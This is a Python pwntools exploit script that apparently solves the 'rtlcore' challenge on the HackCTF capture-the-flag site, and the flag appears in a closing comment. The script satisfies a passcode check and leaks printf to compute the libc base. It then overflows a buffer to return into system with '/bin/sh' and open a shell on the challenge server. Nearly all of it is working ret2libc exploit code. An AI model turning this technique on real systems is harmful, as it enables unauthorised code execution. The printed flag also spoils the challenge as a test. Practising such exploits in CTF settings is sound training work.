#! -*- coding:utf-8 -*-
from pwn import *
#check input passcode with 0xc0d9b0a7. 
#input byte should 20bytes, 4*5, divided into 4 bytes and add them. 
#if input corret codes, it show printf's address, and input 0x64bytes. 

state = 1	#0 in locall

if state == 0:
	p = process("./rtlcore")
	print_offset = 0x50b60
	system_offset = 0x3cd10
	bin_offset = 0x17b8cf
else :		# in remotely
	p = remote("ctf.j0n9hyun.xyz",3015)
	print_offset = 0x49020
	bin_offset =  0x15902b
	system_offset =  0x3a940
	

payload = p32(0x2691f021)*3+p32(0x2691f022)*2
pause()
p.sendlineafter("Passcode: ",payload)
p.recvuntil("바로 ")
rcv = int(p.recv(10),16)
libc = rcv-print_offset

system = libc+system_offset
bin = libc+bin_offset

log.info("addr : "+hex(libc))

sleep(0.5)
pause()
payload2 = "a"*0x42
payload2 += p32(system) + "b"*4 + p32(bin)
p.sendlineafter("일거야",payload2)

p.interactive()

#HackCTF{5ucc355ful_r7lc0r3_f1l3_4cc355}